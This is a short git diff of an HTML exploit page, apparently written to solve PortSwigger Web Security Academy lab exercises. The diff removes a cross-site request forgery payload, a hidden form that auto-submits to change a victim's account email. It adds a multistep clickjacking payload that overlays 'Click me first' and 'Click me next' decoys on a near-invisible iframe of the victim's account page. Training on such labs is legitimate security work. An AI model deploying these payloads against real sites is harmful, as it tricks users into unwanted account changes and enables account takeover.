@@ -1,14 +1,35 @@
 <!DOCTYPE html>
 <html lang="en">
+<style>
+    body {
+        position: relative;
+    }
+
+    #vic {
+        width: 500px;
+        height: 700px;
+        z-index: 2;
+        opacity: 0.1;
+        position: absolute;
+    }
+
+    #div1 {
+        z-index: 1;
+        position: absolute;
+        top: 490px;
+        left: 40px;
+    }
+
+    #div2 {
+        z-index: 1;
+        position: absolute;
+        top: 285px;
+        left: 200px;
+    }
+</style>
 <body>
-    <meta name="referrer" content="unsafe-url">
-    <form method="POST" action="https://0a7c00d00377a0b881db2a2500750082.web-security-academy.net/my-account/change-email">
-        <input type="hidden" name="email" value="11hell@web-security-academy.net">
-    </form>
-    <script>
-        document.forms[0].submit();
-    </script>
+    <div id="div1">Click me first</div>
+    <div id="div2">Click me next</div>
+    <iframe id="vic" src="https://0ab6000904f9708a813ac59100830033.web-security-academy.net/my-account"></iframe>
 </body>
-
 </html>
-
